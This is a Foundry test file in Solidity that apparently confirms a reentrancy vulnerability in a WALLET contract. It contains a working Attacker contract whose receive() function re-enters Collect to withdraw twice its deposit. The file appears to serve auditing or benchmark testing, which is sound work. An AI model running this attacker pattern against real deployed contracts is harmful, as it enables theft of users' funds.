
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {WALLET, Log} from "../src/WALLET.sol";

contract TestReentrancyWALLET is Test {

    WALLET public wallet;
    Log public log;
    Attacker public _attacker;

    function setUp() public {
        log = new Log();
        wallet = new WALLET(address(log));
        _attacker = new Attacker(address(wallet));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal >= 500000000000000000);
        vm.assume(attackVal < 1000000000000000000);
        vm.assume(attackVal <= uint256(type(uint128).max) / 2);
        

        // --- 2. State Configuration (Pre-Condition) ---
        

        // --- 3. Funding ---
        
        vm.deal(address(wallet), attackVal * 2); 
        
        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), attackVal * 2);
        
        
        _attacker.setupAttack{value: attackVal * 2}(attackVal);
        
        vm.warp(block.timestamp + 1);
        
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    WALLET public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedVal;

    constructor(address victimAddress) { 
        victim = WALLET(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        victim.Put{value: val * 2}(0);
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        storedVal = val;

        victim.Collect(val);

        uint256 finalBalance = address(this).balance;
        if (attackCallCount == 2 && finalBalance == initialSnapshot + val * 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            victim.Collect(storedVal);
        }
    }
}
